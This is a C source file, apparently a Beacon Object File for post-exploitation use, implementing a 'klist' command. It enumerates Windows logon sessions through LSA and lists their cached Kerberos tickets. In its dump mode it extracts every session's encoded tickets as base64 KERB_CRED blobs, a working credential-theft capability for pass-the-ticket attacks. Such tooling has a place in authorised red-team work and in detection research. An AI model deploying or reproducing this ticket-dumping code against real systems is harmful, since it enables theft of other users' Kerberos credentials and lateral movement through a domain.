#include "klist.h"

void execute_klist(WCHAR **dispatch, LUID luid, BOOL currentLuid, BOOL dump)
{
    BOOL highIntegrity = IsHighIntegrity();
    if (!highIntegrity && !currentLuid)
    {
        PRINT(dispatch, "[!] Not in high integrity.\n");
        return;
    }
    HANDLE hLsa;
    NTSTATUS status = GetLsaHandle(highIntegrity, &hLsa);
    if (!NT_SUCCESS(status))
    {
        PRINT(dispatch, "[!] GetLsaHandle %ld\n", status);
        return;
    }
    ULONG authPackage;
    LSA_STRING krbAuth = {.Buffer = "kerberos", .Length = 8, .MaximumLength = 9};
    status = SECUR32$LsaLookupAuthenticationPackage(hLsa, &krbAuth, &authPackage);
    if (!NT_SUCCESS(status))
    {
        PRINT(dispatch, "[!] LsaLookupAuthenticationPackage %ld\n", ADVAPI32$LsaNtStatusToWinError(status));
        SECUR32$LsaDeregisterLogonProcess(hLsa);
        return;
    }
    LOGON_SESSION_DATA sessionData;
    status = GetLogonSessionData(luid, &sessionData);
    if (!NT_SUCCESS(status))
    {
        PRINT(dispatch, "[!] GetLogonSessionData: %ld", status);
        SECUR32$LsaDeregisterLogonProcess(hLsa);
        return;
    }
    KERB_QUERY_TKT_CACHE_REQUEST cacheRequest;
    cacheRequest.MessageType = KerbQueryTicketCacheExMessage;
    for (int i = 0; i < sessionData.sessionCount; i++)
    {
        if (sessionData.sessionData[i] == NULL)
        {
            continue;
        }
        if (highIntegrity)
        {
            cacheRequest.LogonId = sessionData.sessionData[i]->LogonId;
        }
        else
        {
            cacheRequest.LogonId = (LUID){.HighPart = 0, .LowPart = 0};
        }

        char *sessionString = NULL;
        PrintLogonSessionData(*sessionData.sessionData[i], &sessionString);
        SECUR32$LsaFreeReturnBuffer(sessionData.sessionData[i]);
        KERB_QUERY_TKT_CACHE_EX_RESPONSE *cacheResponse = NULL;
        KERB_TICKET_CACHE_INFO_EX cacheInfo;
        ULONG responseSize;
        NTSTATUS protocolStatus;
        status = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, &cacheRequest, sizeof(cacheRequest),
                                                      &cacheResponse, &responseSize, &protocolStatus);
        if (!NT_SUCCESS(status))
        {
            PRINT(dispatch, "[!] LsaCallAuthenticationPackage %ld\n", ADVAPI32$LsaNtStatusToWinError(status));
            if (sessionString != NULL)
            {
                MSVCRT$free(sessionString);
            }
            continue;
        }
        // check protocol status?
        if (cacheResponse == NULL)
        {
            if (sessionString != NULL)
            {
                MSVCRT$free(sessionString);
            }
            continue;
        }
        int ticketCount = cacheResponse->CountOfTickets;
        if (sessionString != NULL)
        {
            PRINT(dispatch, "%s\n\n[*] Cached tickets: (%d)\n\n", sessionString, ticketCount);
            MSVCRT$free(sessionString);
        }
        else
        {
            PRINT(dispatch, "[!] Unable to print session.\n\n");
        }
        if (ticketCount > 0)
        {
            for (int j = 0; j < ticketCount; j++)
            {
                cacheInfo = cacheResponse->Tickets[j];
                char *ticketInfo = NULL;
                PrintTicketInfo(cacheInfo, &ticketInfo);
                if (ticketInfo != NULL)
                {
                    PRINT(dispatch, "\t[%d]\n%s\n", j, ticketInfo);
                    MSVCRT$free(ticketInfo);
                }
                else
                {
                    PRINT(dispatch, "\t[!] Unable to print ticket info.\n");
                }

                if (dump)
                {
                    PUCHAR ticket;
                    ULONG ticketSize;
                    status = ExtractTicket(hLsa, authPackage, cacheRequest.LogonId, cacheInfo.ServerName, &ticket,
                                           &ticketSize);
                    if (!NT_SUCCESS(status))
                    {
                        PRINT(dispatch, "\t[!] Could not extract a ticket: %ld\n", status);
                    }
                    else
                    {
                        if (ticketSize > 0)
                        {
                            int len = Base64encode_len(ticketSize);
                            char *encoded = (char *)MSVCRT$calloc(len, sizeof(char));
                            if (encoded == NULL)
                            {
                                PRINT(dispatch, "\t[!] Could not allocate memory (base64).\n");
                                continue;
                            }
                            Base64encode(encoded, ticket, ticketSize);
                            PRINT(dispatch, "\tTicket           : %s\n\n", encoded);
                            MSVCRT$free(encoded);
                            MSVCRT$free(ticket);
                        }
                    }
                }
            }
        }
        SECUR32$LsaFreeReturnBuffer(cacheResponse);
    }
    MSVCRT$free(sessionData.sessionData);
    SECUR32$LsaDeregisterLogonProcess(hLsa);
}

NTSTATUS ExtractTicket(HANDLE hLsa, ULONG authPackage, LUID luid, UNICODE_STRING targetName, PUCHAR *ticket,
                       PULONG ticketSize)
{
    KERB_RETRIEVE_TKT_REQUEST *retrieveRequest = NULL;
    KERB_RETRIEVE_TKT_RESPONSE *retrieveResponse = NULL;
    ULONG responseSize = sizeof(KERB_RETRIEVE_TKT_REQUEST) + targetName.MaximumLength;
    retrieveRequest = (KERB_RETRIEVE_TKT_REQUEST *)MSVCRT$calloc(responseSize, sizeof(KERB_RETRIEVE_TKT_REQUEST));
    if (retrieveRequest == NULL)
    {
        return STATUS_MEMORY_NOT_ALLOCATED;
    }
    retrieveRequest->MessageType = KerbRetrieveEncodedTicketMessage;
    retrieveRequest->LogonId = luid;
    retrieveRequest->TicketFlags = 0;
    retrieveRequest->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
    retrieveRequest->EncryptionType = 0;
    retrieveRequest->TargetName = targetName;
    retrieveRequest->TargetName.Buffer = (PWSTR)((PBYTE)retrieveRequest + sizeof(KERB_RETRIEVE_TKT_REQUEST));
    _memcpy(retrieveRequest->TargetName.Buffer, targetName.Buffer, targetName.MaximumLength);

    NTSTATUS protocolStatus;
    NTSTATUS status = STATUS_SUCCESS;
    status = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, retrieveRequest, responseSize, &retrieveResponse,
                                                  &responseSize, &protocolStatus);
    MSVCRT$free(retrieveRequest);
    if (NT_SUCCESS(status))
    {
        if (NT_SUCCESS(protocolStatus))
        {
            if (responseSize > 0)
            {
                ULONG size = retrieveResponse->Ticket.EncodedTicketSize;
                PUCHAR returnTicket = (PUCHAR)MSVCRT$calloc(size, sizeof(UCHAR));
                if (returnTicket != NULL)
                {
                    _memcpy(returnTicket, retrieveResponse->Ticket.EncodedTicket, size);
                    *ticket = returnTicket;
                    *ticketSize = size;
                }
                else
                {
                    status = STATUS_MEMORY_NOT_ALLOCATED;
                }
                SECUR32$LsaFreeReturnBuffer(retrieveResponse);
            }
        }
        else
        {
            status = ADVAPI32$LsaNtStatusToWinError(protocolStatus);
        }
    }
    else
    {
        status = ADVAPI32$LsaNtStatusToWinError(status);
    }
    return status;
}

void PrintTicketFlags(ULONG ticketFlags, char **flagsString)
{
    char *flags[16] = {
        "name_canonicalize ",
        "anonymous ",
        "ok_as_delegate ",
        "? ",
        "hw_authent ",
        "pre_authent ",
        "initial ",
        "renewable ",
        "invalid ",
        "postdated ",
        "may_postdate ",
        "proxy ",
        "proxiable ",
        "forwarded ",
        "forwardable ",
        "reserved "};

    *flagsString = MSVCRT$malloc(512 * sizeof(char));
    if (*flagsString == NULL)
    {
        return NULL;
    }

    int pos = 0;
    for (int i = 0; i < 16; i++)
    {
        if ((ticketFlags >> (i + 16)) & 1)
        {
            _strcpy(*flagsString + pos, flags[i]);
            pos += _strlen(flags[i]);
        }
    }

    if (FAILED(_StringCchPrintfExA(*flagsString + pos, 21, NULL, NULL, NULL, "(0x%lx)\0", ticketFlags)))
    {
        MSVCRT$free(*flagsString);
        *flagsString = NULL;
    }
}

void PrintTicketInfo(KERB_TICKET_CACHE_INFO_EX cacheInfo, char **ticketInfo)
{
    char *fmt = "\tClient name      : %s @ %s\n"
                "\tServer name      : %s @ %s\n"
                "\tStart time (UTC) : %d/%d/%d %d:%d:%d\n"
                "\tEnd time (UTC)   : %d/%d/%d %d:%d:%d\n"
                "\tRenew time (UTC) : %d/%d/%d %d:%d:%d\n"
                "\tFlags            : %s\n"
                "\tEncryption type  : %s\n";

    ANSI_STRING clientName = {0};
    ANSI_STRING clientRealm = {0};
    ANSI_STRING serverName = {0};
    ANSI_STRING serverRealm = {0};
    NTDLL$RtlUnicodeStringToAnsiString(&clientName, &cacheInfo.ClientName, TRUE);
    NTDLL$RtlUnicodeStringToAnsiString(&serverName, &cacheInfo.ServerName, TRUE);
    NTDLL$RtlUnicodeStringToAnsiString(&clientRealm, &cacheInfo.ClientRealm, TRUE);
    NTDLL$RtlUnicodeStringToAnsiString(&serverRealm, &cacheInfo.ServerRealm, TRUE);
    SYSTEMTIME startTime = ConvertToSystemtime(cacheInfo.StartTime);
    SYSTEMTIME endTime = ConvertToSystemtime(cacheInfo.EndTime);
    SYSTEMTIME renewTime = ConvertToSystemtime(cacheInfo.RenewTime);
    char *flags = NULL;
    PrintTicketFlags(cacheInfo.TicketFlags, &flags);
    char *encTypeString = NULL;
    GetEncryptionTypeString(cacheInfo.EncryptionType, &encTypeString);

    int size = _strlen(fmt) +
               clientName.Length +
               clientRealm.Length +
               serverName.Length +
               serverRealm.Length +
               24 + 24 + 24 + 1;

    if (encTypeString != NULL)
    {
        size += _strlen(encTypeString);
    }

    if (flags != NULL)
    {
        size += _strlen(flags);
    }

    *ticketInfo = MSVCRT$malloc(size * sizeof(char));
    if (*ticketInfo == NULL)
    {
        goto end;
    }

    HRESULT result = _StringCchPrintfExA(*ticketInfo, size, NULL, NULL, STRSAFE_IGNORE_NULLS, fmt,
                                         clientName.Buffer, clientRealm.Buffer,
                                         serverName.Buffer, serverRealm.Buffer,
                                         startTime.wDay, startTime.wMonth, startTime.wYear, startTime.wHour, startTime.wMinute, startTime.wSecond,
                                         endTime.wDay, endTime.wMonth, endTime.wYear, endTime.wHour, endTime.wMinute, endTime.wSecond,
                                         renewTime.wDay, renewTime.wMonth, renewTime.wYear, renewTime.wHour, renewTime.wMinute, renewTime.wSecond,
                                         flags,
                                         encTypeString);

    if (FAILED(result))
    {
        MSVCRT$free(*ticketInfo);
        *ticketInfo = NULL;
    }
end:
    if (flags != NULL)
    {
        MSVCRT$free(flags);
    }
    if (encTypeString != NULL)
    {
        MSVCRT$free(encTypeString);
    }
    NTDLL$RtlFreeAnsiString(&clientName);
    NTDLL$RtlFreeAnsiString(&serverName);
    NTDLL$RtlFreeAnsiString(&clientRealm);
    NTDLL$RtlFreeAnsiString(&serverRealm);
}
